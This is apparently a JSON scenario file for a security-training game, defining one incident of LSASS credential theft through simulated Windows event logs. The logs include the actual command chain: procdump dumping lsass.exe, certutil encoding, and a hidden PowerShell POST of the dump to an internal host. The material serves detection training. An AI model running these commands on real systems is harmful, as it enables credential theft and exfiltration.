@@ -1,0 +1,192 @@
+[
+  {
+    "Name": "LSASS憑證竊取",
+    "EventID": "Multi",
+    "EventName": "內部帳號疑似遭利用執行LSASS記憶體竊取憑證",
+    "Description": "攻擊者使用it-admin帳號，從192.168.0.1遠端登入192.168.0.4，取得高權限",
+    "SourceIP": {
+      "IP": "192.168.0.1",
+      "Source": {
+        "IsFromCompany?": true
+      },
+      "BeenBlocking?": false,
+      "isDanger?": true,
+      "Port": "N/A",
+      "Index": 0,
+      "Direction": "Internal",
+      "Department": "IT"
+    },
+    "EventType": "Hacked",
+    "Stage": 1,
+    "SolveType": "ChangeCharacter",
+    "SourceIPs": [
+      {
+        "IP": "192.168.0.1",
+        "Source": {
+          "IsFromCompany?": true
+        },
+        "BeenBlocking?": false,
+        "isDanger?": true,
+        "Port": "N/A",
+        "Index": 0,
+        "Direction": "Internal",
+        "Department": "IT"
+      }
+    ],
+    "AttackTimes": 1,
+    "CostMoney": 0,
+    "CostPlayerCreditInCompany": 0,
+    "GainCredit": 0,
+    "Commentary": "",
+    "BadResultText": "",
+    "GoodResultText": "",
+    "AttackStep": 1,
+    "S_EventJsonCode": [
+      {
+        "TimeStamp": "2025-11-19T10:00:01",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4624",
+        "LogonType": 10,
+        "Src_Ip": "192.168.0.1",
+        "Dst_Ip": "192.168.0.4",
+        "Channel": "Security",
+        "LogonProcess": "User32"
+      },
+      {
+        "TimeStamp": "2025-11-19T10:00:03",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4672",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.1",
+        "Dst_Ip": "192.168.0.4",
+        "SpecialPrivilegesAssigned": [
+          "SeDebugPrivilege",
+          "SeTcbPrivilege",
+          "SeBackupPrivilege"
+        ]
+      },
+      {
+        "TimeStamp": "2025-11-19T10:00:05",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4688",
+        "Process_Image": "C:\\Windows\\System32\\cmd.exe",
+        "Parent_Image": "C:\\Windows\\System32\\winlogon.exe",
+        "CommandLine": "cmd.exe /c whoami /priv",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.4",
+        "Dst_Ip": "192.168.0.5"
+      },
+      {
+        "TimeStamp": "2025-11-19T10:00:08",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4688",
+        "Process_Image": "C:\\Windows\\System32\\whoami.exe",
+        "Parent_Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "whoami /priv",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.4",
+        "Dst_Ip": "192.168.0.5"
+      },
+      {
+        "TimeStamp": "2025-11-19T10:00:12",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4688",
+        "Process_Image": "C:\\Windows\\System32\\tasklist.exe",
+        "Parent_Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "tasklist.exe /FI \"IMAGENAME eq lsass.exe\"",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.4",
+        "Dst_Ip": "192.168.0.5"
+      },
+      {
+        "TimeStamp": "2025-11-19T10:00:15",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4688",
+        "Process_Image": "C:\\Tools\\procdump64.exe",
+        "Parent_Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.4",
+        "Dst_Ip": "192.168.0.5"
+      },
+      {
+        "TimeStamp": "2025-11-19T10:00:18",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4688",
+        "Process_Image": "C:\\Windows\\System32\\powershell.exe",
+        "Parent_Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "powershell -nop -w hidden -c \"Compress-Archive -Path C:\\Temp\\lsass.dmp -DestinationPath C:\\Temp\\lsass.zip\"",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.4",
+        "Dst_Ip": "192.168.0.5"
+      },
+      {
+        "TimeStamp": "2025-11-19T10:00:22",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4688",
+        "Process_Image": "C:\\Windows\\System32\\certutil.exe",
+        "Parent_Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "certutil -encode C:\\Temp\\lsass.zip C:\\Temp\\lsass.b64",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.4",
+        "Dst_Ip": "192.168.0.5"
+      },
+      {
+        "TimeStamp": "2025-11-19T10:00:26",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4688",
+        "Process_Image": "C:\\Windows\\System32\\powershell.exe",
+        "Parent_Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "powershell -nop -w hidden -c \"Invoke-WebRequest -Uri http://192.168.0.1/upload -Method POST -InFile C:\\Temp\\lsass.b64\"",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.4",
+        "Dst_Ip": "192.168.0.1"
+      },
+      {
+        "TimeStamp": "2025-11-19T09:59:55",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4688",
+        "Process_Image": "C:\\Windows\\Explorer.exe",
+        "Parent_Image": "C:\\Windows\\System32\\userinit.exe",
+        "CommandLine": "C:\\Windows\\Explorer.exe",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.4",
+        "Dst_Ip": "192.168.0.5"
+      },
+      {
+        "TimeStamp": "2025-11-19T10:00:02",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4688",
+        "Process_Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+        "Parent_Image": "C:\\Windows\\Explorer.exe",
+        "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.4",
+        "Dst_Ip": "192.168.0.5"
+      },
+      {
+        "TimeStamp": "2025-11-19T10:00:06",
+        "HostName": "WS-04",
+        "User": "it-admin",
+        "EventID": "4688",
+        "Process_Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "Parent_Image": "C:\\Windows\\Explorer.exe",
+        "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://intranet.company.local",
+        "Channel": "Security",
+        "Src_Ip": "192.168.0.4",
+        "Dst_Ip": "192.168.0.5"
+      }
+    ]
+  }
+]
